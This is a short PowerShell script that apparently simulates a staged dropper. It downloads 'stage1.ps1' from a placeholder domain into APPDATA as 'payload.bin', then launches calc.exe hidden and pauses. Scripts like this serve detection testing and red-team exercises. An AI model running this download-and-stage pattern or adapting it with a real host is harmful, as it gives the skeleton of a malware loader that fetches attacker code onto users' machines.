
$DownloadUrl = "https://contoso.com/stage1.ps1"
$Stage2Path = "$env:APPDATA\payload.bin"
$RequestTimeout = 28
Invoke-WebRequest -Uri $DownloadUrl -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
Start-Sleep -Seconds 36
